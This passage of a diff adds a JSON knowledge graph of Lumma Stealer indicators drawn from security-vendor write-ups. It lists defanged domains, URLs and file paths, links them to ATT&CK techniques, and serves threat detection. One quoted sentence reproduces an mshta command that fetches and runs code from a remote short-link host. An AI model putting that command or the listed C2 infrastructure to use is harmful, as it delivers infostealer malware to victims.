+              "Dynamic analysis revealed that Lumma is calling multiple domains before calling the legitimate “steamcommunity.com”."
+            ]
+          ]
+        },
+        "raw_value": "steamcommunity[.]com",
+        "canonical_value": "steamcommunity.com",
+        "normalized_value": "steamcommunity.com",
+        "alias": [
+          "steamcommunity.com"
+        ]
+      },
+      {
+        "node_id": "IOC_1e13489b1298",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "wsimg.com",
+        "edges": [],
+        "source": {
+          "wsimg.com_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              10,
+              "The attackers leverage the credibility of widely recognized hosting services to host these malicious PDFs, including platforms like wsimg.com and cdn-website.com."
+            ]
+          ]
+        },
+        "raw_value": "wsimg.com",
+        "canonical_value": "wsimg.com",
+        "normalized_value": "wsimg.com"
+      },
+      {
+        "node_id": "IOC_39f650d600a4",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "cdn-website.com",
+        "edges": [],
+        "source": {
+          "cdn-website.com_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              10,
+              "The attackers leverage the credibility of widely recognized hosting services to host these malicious PDFs, including platforms like wsimg.com and cdn-website.com."
+            ]
+          ]
+        },
+        "raw_value": "cdn-website.com",
+        "canonical_value": "cdn-website.com",
+        "normalized_value": "cdn-website.com"
+      },
+      {
+        "node_id": "IOC_750303ae8f6c",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "\\\\Appdata\\\\Local\\\\Temp",
+        "edges": [],
+        "source": {
+          "\\\\Appdata\\\\Local\\\\Temp_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              45,
+              "Upon execution, it performs a series of actions including creating .accde files in the \\\\Appdata\\\\Local\\\\Temp folder, which is then used to create an AutoIT compiled executable along with a malicious .a3x script."
+            ]
+          ]
+        },
+        "raw_value": "\\\\Appdata\\\\Local\\\\Temp",
+        "canonical_value": "\\\\Appdata\\\\Local\\\\Temp",
+        "normalized_value": "\\\\Appdata\\\\Local\\\\Temp"
+      },
+      {
+        "node_id": "IOC_d536813cee15",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "dogalmedical[.]org",
+        "edges": [
+          "EDGE_2a90cac27680",
+          "EDGE_98f87b0cbec0"
+        ],
+        "source": {
+          "dogalmedical[.]org_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              38,
+              "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration."
+            ]
+          ]
+        },
+        "raw_value": "dogalmedical[.]org",
+        "canonical_value": "dogalmedical.org",
+        "normalized_value": "dogalmedical.org"
+      },
+      {
+        "node_id": "IOC_f04301b59ec2",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "t[.]me",
+        "edges": [
+          "EDGE_dbdb2384c1f3",
+          "EDGE_e78d86c08edf"
+        ],
+        "source": {
+          "t[.]me_www.forcepoint.com_blog_x-labs_unmasking-lumma-stealer-campaign": [
+            [
+              38,
+              "While the file (Alexander.com) is running, it tries to connect to sites like t[.]me, steamcommunity[.]com, and C2s like dogalmedical[.]org for data exfiltration."
+            ]
+          ]
+        },
+        "raw_value": "t[.]me",
+        "canonical_value": "t.me",
+        "normalized_value": "t.me"
+      },
+      {
+        "node_id": "IOC_2000bd3a1be7",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "scw.cloud",
+        "edges": [
+          "EDGE_71617bc697bc"
+        ],
+        "source": {
+          "scw.cloud_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              18,
+              "scw.cloud is the domain for Scaleway."
+            ]
+          ]
+        },
+        "raw_value": "scw.cloud",
+        "canonical_value": "scw.cloud",
+        "normalized_value": "scw.cloud"
+      },
+      {
+        "node_id": "IOC_27b74a8f0537",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "googleadservices[.]com",
+        "edges": [
+          "EDGE_587e1feb1453"
+        ],
+        "source": {
+          "googleadservices[.]com_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              11,
+              "Each URL was wrapped in a googleadservices[.]com link."
+            ]
+          ]
+        },
+        "raw_value": "googleadservices[.]com",
+        "canonical_value": "googleadservices.com",
+        "normalized_value": "googleadservices.com"
+      },
+      {
+        "node_id": "IOC_91a9edb38ecd",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "myvantage.getitquickly[.]biz",
+        "edges": [
+          "EDGE_8eceae4c6887"
+        ],
+        "source": {
+          "myvantage.getitquickly[.]biz_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              13,
+              "and reCAPTCHA V3 Security pages)\n- myvantage.getitquickly[.]biz (reCAPTCHA V3 Security page)\n- 657.s3.fr-par.scw[.]cloud (reCAPTCHA V3 Security page)."
+            ],
+            [
+              14,
+              "At the time of the investigation, the myvantage.getitquickly[.]biz URL when visited would redirect to the third URL which was inaccessible, as seen below."
+            ]
+          ]
+        },
+        "raw_value": "myvantage.getitquickly[.]biz",
+        "canonical_value": "myvantage.getitquickly.biz",
+        "normalized_value": "myvantage.getitquickly.biz"
+      },
+      {
+        "node_id": "IOC_9e56c531c6b3",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://astapowerproject[.]net/",
+        "edges": [
+          "EDGE_c1da62f8a72b"
+        ],
+        "source": {
+          "hxxps://astapowerproject[.]net/_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              7,
+              "T1189 – Drive-by Compromise The affected user visited the legitimate hxxps://astapowerproject[.]net/ however this visit led to 12 attempts to visit malicious sites – these were blocked."
+            ]
+          ],
+          "hxxp://astapowerproject[.]net/_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              8,
+              "The hxxp://astapowerproject[.]net/ site was visited."
+            ]
+          ]
+        },
+        "raw_value": "hxxps://astapowerproject[.]net/",
+        "canonical_value": "https://astapowerproject.net/",
+        "normalized_value": "https://astapowerproject.net/",
+        "alias": [
+          "hxxp://astapowerproject[.]net/"
+        ]
+      },
+      {
+        "node_id": "IOC_af27667b37d8",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "871549.eliteeyeview[.]co",
+        "edges": [
+          "EDGE_3e3150ef0627"
+        ],
+        "source": {
+          "871549.eliteeyeview[.]co_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              12,
+              "Subsequent visits were then made to the below malicious CAPTCHA sites in the following order:\n- 871549.eliteeyeview[.]co (…Loading.."
+            ]
+          ]
+        },
+        "raw_value": "871549.eliteeyeview[.]co",
+        "canonical_value": "871549.eliteeyeview.co",
+        "normalized_value": "871549.eliteeyeview.co"
+      },
+      {
+        "node_id": "IOC_d468cd387e49",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "2no[.]co",
+        "edges": [
+          "EDGE_cd1ac4504099"
+        ],
+        "source": {
+          "2no[.]co_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              30,
+              "A successful connection was made to the 2no[.]co domain."
+            ]
+          ]
+        },
+        "raw_value": "2no[.]co",
+        "canonical_value": "2no.co",
+        "normalized_value": "2no.co"
+      },
+      {
+        "node_id": "IOC_e95186004b10",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "657.s3.fr-par.scw[.]cloud",
+        "edges": [
+          "EDGE_a71d50a0c618"
+        ],
+        "source": {
+          "657.s3.fr-par.scw[.]cloud_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              13,
+              "and reCAPTCHA V3 Security pages)\n- myvantage.getitquickly[.]biz (reCAPTCHA V3 Security page)\n- 657.s3.fr-par.scw[.]cloud (reCAPTCHA V3 Security page)."
+            ],
+            [
+              15,
+              "The 657.s3.fr-par.scw[.]cloud domain suggests the resource was hosted on Scaleway, a European cloud provider, rather than AWS."
+            ]
+          ]
+        },
+        "raw_value": "657.s3.fr-par.scw[.]cloud",
+        "canonical_value": "657.s3.fr-par.scw.cloud",
+        "normalized_value": "657.s3.fr-par.scw.cloud"
+      },
+      {
+        "node_id": "IOC_f958070b5304",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxps://2no[.]co/2Od3Q3",
+        "edges": [
+          "EDGE_f501e946dfe8"
+        ],
+        "source": {
+          "hxxps://2no[.]co/2Od3Q3_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              28,
+              "T1218.005 – System Binary Proxy Execution: Mshta Once the Run dialog was opened, a mshta.exe process was created, running the \"mshta.exe\" hxxps://2no[.]co/2Od3Q3 =-+2346823 command."
+            ]
+          ]
+        },
+        "raw_value": "hxxps://2no[.]co/2Od3Q3",
+        "canonical_value": "https://2no.co/2Od3Q3",
+        "normalized_value": "https://2no.co/2Od3Q3"
+      },
+      {
+        "node_id": "IOC_fe88a8dd9018",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com",
+        "edges": [
+          "EDGE_7b94a7451707",
+          "EDGE_d6a92c85a5f6"
+        ],
+        "source": {
+          "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com_www.nccgroup.com_research-blog_fake-captcha-led-to-lumma": [
+            [
+              25,
+              "The C:\\Users\\<USER>\\AppData\\Roaming\\deci.com file was created at the same time as the afc.zip."
+            ]
+          ]
+        },
+        "raw_value": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com",
+        "canonical_value": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com",
+        "normalized_value": "C:\\Users\\<USER>\\AppData\\Roaming\\deci.com"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_0120ad86b4b3",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_06e3dbe50ffc",
+      "node_u": "IOC_ce08fa3e42d0",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0be4ddc72655",
+      "node_u": "HL_ae7ae0795bc4",
+      "node_v": "TTP_T1005",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1e4e1261c92e",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1568",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_2f8b52279fb4",
+      "node_u": "IOC_7fb3ea43ad77",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_3a443f33e286",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1041",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_4b0424d6205b",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1562",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5b2ab5cdbe98",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5df3de05b419",
+      "node_u": "HL_22dbb4876dac",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_66bd904707c8",
+      "node_u": "HL_f8b77c8fe4ea",
+      "node_v": "TTP_T1005",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_80dd8e4acfcd",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1106",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8e8322fd49b0",
+      "node_u": "HL_84858ea90f98",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a06448532393",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a5c2af776aa9",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1083",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c6cc1956b6fa",
+      "node_u": "IOC_048fb1f67a2f",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c92068dab7c3",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1497",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c94e842c7528",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1005",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d1d87e48a7c5",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1001",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d262370f9247",
+      "node_u": "HL_22dbb4876dac",
+      "node_v": "TTP_T1568",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d984a70dcc34",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e5ac937da96f",
+      "node_u": "IOC_ce08fa3e42d0",
+      "node_v": "TTP_T1027",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e603969d204c",
+      "node_u": "IOC_7fb3ea43ad77",
+      "node_v": "TTP_T1568",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_e8bb82a1c34c",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1074",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ee7c1d183bc6",
+      "node_u": "HL_9b5521d9eb21",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f08b2c16e203",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f26373c2e581",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1140",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_fedc2391e361",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_08f93221df66",
+      "node_u": "HL_6c8a333930de",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_096541b6807b",
+      "node_u": "HL_25da5e1178db",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0cd67f5ac947",
+      "node_u": "HL_25da5e1178db",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1f3ab148d259",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1573",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_26a8fc6e21a2",
+      "node_u": "IOC_048fb1f67a2f",
+      "node_v": "TTP_T1041",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2a90cac27680",
+      "node_u": "IOC_d536813cee15",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2edc22aeb0f3",
+      "node_u": "HL_25da5e1178db",
+      "node_v": "TTP_T1106",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_472715b1d6cf",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5ae49dc37cfa",
+      "node_u": "HL_25da5e1178db",
+      "node_v": "TTP_T1055",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_98f87b0cbec0",
+      "node_u": "IOC_d536813cee15",
+      "node_v": "TTP_T1041",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_9de999bb382b",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1114",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_da50ffe5fd8a",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_dbdb2384c1f3",
+      "node_u": "IOC_f04301b59ec2",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_de91a95465c8",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e78d86c08edf",
+      "node_u": "IOC_f04301b59ec2",
+      "node_v": "TTP_T1041",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f55df411f5fa",
+      "node_u": "HL_25da5e1178db",
+      "node_v": "TTP_T1041",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_0614f566784c",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1ac302a91aa5",
+      "node_u": "HL_6adc15335b24",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_21f114a92109",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1218",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3e3150ef0627",
+      "node_u": "IOC_af27667b37d8",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_5144e53ca8f3",
+      "node_u": "HL_28bb92983c8f",
+      "node_v": "TTP_T1189",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_587e1feb1453",
+      "node_u": "IOC_27b74a8f0537",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_62d60562017e",
+      "node_u": "HL_70774b9d2409",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_71617bc697bc",
+      "node_u": "IOC_2000bd3a1be7",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7b94a7451707",
+      "node_u": "IOC_fe88a8dd9018",
+      "node_v": "TTP_T1059",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_84100496aab4",
+      "node_u": "HL_03e5aa791b9b",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8eceae4c6887",
+      "node_u": "IOC_91a9edb38ecd",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_a71d50a0c618",
+      "node_u": "IOC_e95186004b10",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c1da62f8a72b",
+      "node_u": "IOC_9e56c531c6b3",
+      "node_v": "TTP_T1189",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd1ac4504099",
+      "node_u": "IOC_d468cd387e49",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0561c2b16e8",
+      "node_u": "HL_a81bc98d80e7",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d47a0ca9e0e6",
+      "node_u": "HL_70774b9d2409",
+      "node_v": "TTP_T1555",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d6a92c85a5f6",
+      "node_u": "IOC_fe88a8dd9018",
+      "node_v": "TTP_T1555",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_f501e946dfe8",
+      "node_u": "IOC_f958070b5304",
+      "node_v": "TTP_T1218",
+      "edge_type": "ioc-ttp"
+    }
+  ]
+}
